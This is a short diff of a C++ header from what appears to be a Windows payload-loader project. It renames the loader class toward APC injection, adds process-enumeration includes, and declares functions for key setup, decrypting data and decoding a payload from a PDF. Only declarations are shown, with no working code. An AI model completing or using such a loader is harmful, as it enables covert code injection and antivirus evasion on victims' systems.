@@ -1,11 +1,9 @@
 //
-// Created by au9u5t on 24-9-30.
+// Created by au9u5t on 24-10-2.
 //
 
-#ifndef ARINGQUSEMAKEFILE_DIRECTLYLOAD_H
-#define ARINGQUSEMAKEFILE_DIRECTLYLOAD_H
-
-
+#ifndef ARINGQUSEMAKEFILE_APCLOAD_H
+#define ARINGQUSEMAKEFILE_APCLOAD_H
 
 #include <mutex>
 #include <string>
@@ -19,17 +17,17 @@
 #include "windows.h"
 #include <vector>
 #include <algorithm>
-
+#include <TLHelp32.H>
 using namespace std;
 
-class __declspec(dllimport) MasterEncoderForDirectlyLoader;
+class __declspec(dllimport) MasterEncoderForApcLoadder;
 
-class MasterEncoderForDirectlyLoader
+class MasterEncoderForApcLoadder
 {
 public:
-    static MasterEncoderForDirectlyLoader* getInstance();
-    MasterEncoderForDirectlyLoader();
-    ~MasterEncoderForDirectlyLoader();
+    static MasterEncoderForApcLoadder* getInstance();
+    MasterEncoderForApcLoadder();
+    ~MasterEncoderForApcLoadder();
 
     void setSignAndKey(char* sign, int signLen, unsigned char key);
 
@@ -47,9 +45,10 @@ public:
 public:
     static void function1(const unsigned char *decryptedData, const size_t &byteLength);
     static void generateAndSortArray();
+    static bool stringCmp(char *a, std::string b);
 
 private:
-    static MasterEncoderForDirectlyLoader* _instance;
+    static MasterEncoderForApcLoadder* _instance;
     static mutex _mtx;
 
     unsigned char _codeKey;
@@ -58,6 +57,4 @@ private:
 
     unsigned char *decodePDF(const string &pdfPath, long &size);
 };
-
-
-#endif //ARINGQUSEMAKEFILE_DIRECTLYLOAD_H
+#endif //ARINGQUSEMAKEFILE_APCLOAD_H
